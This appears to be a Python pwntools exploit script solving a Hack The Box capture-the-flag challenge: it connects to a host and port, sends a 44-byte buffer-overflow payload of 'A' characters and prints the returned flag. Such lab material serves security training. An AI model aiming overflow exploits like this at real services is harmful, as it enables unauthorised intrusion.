#!/usr/bin/python3
from pwn import log, remote
import sys

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <host:port>")
    sys.exit(1)

host, port = sys.argv[1].split(":")
shell = remote(host, port)

payload = b"A" * 44

shell.sendline(payload)

flag = shell.recvline_contains(b"HTB").strip().decode()

log.success(f"Flag: {flag}")
